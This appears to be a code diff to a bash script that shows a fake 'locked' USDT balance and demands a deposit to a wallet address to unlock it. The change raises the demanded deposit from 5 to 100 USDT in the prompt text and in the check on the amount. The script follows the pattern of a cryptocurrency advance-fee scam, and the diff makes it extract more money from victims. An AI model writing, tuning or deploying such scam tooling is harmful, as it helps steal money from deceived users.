@@ -36,7 +36,7 @@ echo -e "$usdt_logo"
 
 fancyBoxEcho "$welcome_message"
 
-echo -e "To unlock your balance of $balance USDT, please deposit 5 USDT to the following address: $account_id"
+echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT to the following address: $account_id"
 
 function unlockBalance {
     echo " "
@@ -57,7 +57,7 @@ echo " "
 
 refreshOnSuccess
 
-if [[ $depositAmount -eq 5 && $transactionHash == "$hash_id" ]]; then
+if [[ $depositAmount -eq 100 && $transactionHash == "$hash_id" ]]; then
 
 echo -e " \e[32mSuccessfully Unlocked procedding...\e[0m"
         echo " "
@@ -145,7 +145,7 @@ function refresh {
     echo -e "$usdt_logo"
     echo " "
     fancyBoxEcho "$welcome_message"
-    echo -e "To unlock your balance of $balance USDT, please deposit 5 USDT Under TRC20 to the following address: $account_id"
+    echo -e "To unlock your balance of $balance USDT, please deposit 100 USDT Under TRC20 to the following address: $account_id"
 }
 function refreshOnSuccess {
     echo "Authenticating....."
